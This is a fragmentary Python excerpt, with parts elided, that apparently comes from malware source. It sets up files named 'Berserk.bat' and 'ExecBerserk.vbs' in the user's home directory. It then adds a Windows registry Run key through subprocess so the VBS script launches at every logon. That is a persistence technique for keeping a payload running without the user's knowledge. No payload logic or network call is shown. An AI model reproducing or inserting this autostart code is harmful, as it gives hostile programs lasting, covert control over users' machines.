...
batch_file_path = os.path.join(home_directory, 'Berserk.bat')
vbs_script_path = os.path.join(home_directory, 'ExecBerserk.vbs')
...
try:
    ...
    subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Berserk", "/t", "REG_SZ", "/d", f"{vbs_script_path}", "/f"], shell=True)
